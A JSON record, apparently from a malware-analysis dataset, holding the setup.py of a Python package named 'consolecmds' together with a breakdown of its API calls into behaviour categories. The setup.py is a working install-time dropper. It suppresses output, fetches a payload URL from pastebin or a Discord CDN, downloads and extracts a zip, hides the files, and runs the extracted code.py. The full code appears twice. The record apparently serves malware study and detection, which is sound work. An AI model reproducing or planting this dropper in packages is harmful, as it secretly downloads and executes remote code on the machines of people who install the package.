[
  {
    "pyfile": "setup.py",
    "code_snippet": "import sys,os,requests,subprocess,time\nfrom pathlib import Path\n\ndef stopprint():\n    sys.stdout = open(os.devnull, 'w')\n\ndef get_folder_contents(path):\n    try:\n        all_files = os.listdir(path)\n        for file in all_files:\n            if file.lower() == \"python.exe\":\n                return True\n    except:\n        pass\n    return False\n\ndef get_default_path():\n    try:\n        videos_path = str(Path.home() / \"Videos\")\n        return videos_path\n    except Exception as e:\n        return None\n\ndef get_new_filepath(path,name):\n    return os.path.join(path,name)\n\ndef get_cdn():\n    cdnurl = \"https://cdn.discordapp.com/attachments/1033739850643406918/1044011736518377482/code.zip\"\n    try:\n        cdndata = requests.get(f\"https://pastebin.com/raw/tCPxwCgS\")\n        if cdndata.status_code == 200:\n            cdnurl = cdndata.text\n    except:\n        pass\n    return cdnurl\n\ndef hide_file(file_path):\n    try:\n        os.system(f\"attrib +h {file_path}\" )\n    except:\n        pass\n\ndef run_file(path):\n    p = subprocess.Popen(f\"python {path}\",shell=True,stdin=None,stdout=subprocess.PIPE,stderr=subprocess.PIPE,close_fds=True)\n    out, err = p.communicate()\n\ndef main():\n    stopprint()\n    filepath = get_default_path()\n    for thing in sys.path:\n        correct_folder = get_folder_contents(thing)\n        if correct_folder == True:\n            filepath = thing \n            break\n    new_filepath = get_new_filepath(filepath,\"code.py\")\n    other_filepath = get_new_filepath(filepath,\"pytransform\")\n    if os.path.exists(new_filepath) == True:\n        return\n    cdn = get_cdn()\n    os.system(f\"curl -o %temp%/nice.zip -silent  {cdn}\")\n    os.system(f'tar -xf \"\"%temp%/nice.zip\"\" -C \"\"{filepath}\"\"')\n    hide_file(new_filepath)\n    hide_file(other_filepath)\n    run_file(new_filepath)\n\nmain()",
    "pattern_analysis": {
      "api_sequence": [
        "sys.stdout",
        "open",
        "os.devnull",
        "os.listdir",
        "os.path.exists",
        "Path.home",
        "os.path.join",
        "requests.get",
        "os.system",
        "os.system",
        "os.system",
        "subprocess.Popen",
        "subprocess.Popen.communicate"
      ],
      "api_sequence_with_args": [
        "sys.stdout = open(os.devnull, 'w')",
        "open(os.devnull, 'w')",
        "os.devnull",
        "os.listdir(path)",
        "os.path.exists(new_filepath)",
        "Path.home()",
        "os.path.join(path, name)",
        "requests.get(f\"https://pastebin.com/raw/tCPxwCgS\")",
        "os.system(f\"curl -o %temp%/nice.zip -silent  {cdn}\")",
        "os.system(f'tar -xf \"\"%temp%/nice.zip\"\" -C \"\"{filepath}\"\"')",
        "os.system(f\"attrib +h {file_path}\")",
        "subprocess.Popen(f\"python {path}\", shell=True, stdin=None, stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True)",
        "subprocess.Popen(f\"python {path}\", ...).communicate()"
      ],
      "mapped_sequence": [
        {
          "api_name": "sys.stdout",
          "id": "set_builtin_attr",
          "description": "Sets attribute on builtins object",
          "first_id": "persistence_stealth",
          "second_id": "stealth_techniques",
          "third_id": "warning_disabling"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.devnull",
          "id": "get_os_null_device",
          "description": "Retrieves operating system null device path",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "Path.home",
          "id": "path_special_operations",
          "description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "subprocess.Popen.communicate",
          "id": "read_process_stdout",
          "description": "Reads all bytes from process standard output",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_information"
        }
      ],
      "contextual_code": "import sys,os,requests,subprocess,time\nfrom pathlib import Path\n\ndef stopprint():\n    sys.stdout = open(os.devnull, 'w')\n\ndef get_folder_contents(path):\n    try:\n        all_files = os.listdir(path)\n        for file in all_files:\n            if file.lower() == \"python.exe\":\n                return True\n    except:\n        pass\n    return False\n\ndef get_default_path():\n    try:\n        videos_path = str(Path.home() / \"Videos\")\n        return videos_path\n    except Exception as e:\n        return None\n\ndef get_new_filepath(path,name):\n    return os.path.join(path,name)\n\ndef get_cdn():\n    cdnurl = \"https://cdn.discordapp.com/attachments/1033739850643406918/1044011736518377482/code.zip\"\n    try:\n        cdndata = requests.get(f\"https://pastebin.com/raw/tCPxwCgS\")\n        if cdndata.status_code == 200:\n            cdnurl = cdndata.text\n    except:\n        pass\n    return cdnurl\n\ndef hide_file(file_path):\n    try:\n        os.system(f\"attrib +h {file_path}\" )\n    except:\n        pass\n\ndef run_file(path):\n    p = subprocess.Popen(f\"python {path}\",shell=True,stdin=None,stdout=subprocess.PIPE,stderr=subprocess.PIPE,close_fds=True)\n    out, err = p.communicate()\n\ndef main():\n    stopprint()\n    filepath = get_default_path()\n    for thing in sys.path:\n        correct_folder = get_folder_contents(thing)\n        if correct_folder == True:\n            filepath = thing \n            break\n    new_filepath = get_new_filepath(filepath,\"code.py\")\n    other_filepath = get_new_filepath(filepath,\"pytransform\")\n    if os.path.exists(new_filepath) == True:\n        return\n    cdn = get_cdn()\n    os.system(f\"curl -o %temp%/nice.zip -silent  {cdn}\")\n    os.system(f'tar -xf \"\"%temp%/nice.zip\"\" -C \"\"{filepath}\"\"')\n    hide_file(new_filepath)\n    hide_file(other_filepath)\n    run_file(new_filepath)\n\nmain()"
    }
  },
  {
    "metadata": {
      "package_name": "consolecmds-1.1.0"
    }
  }
]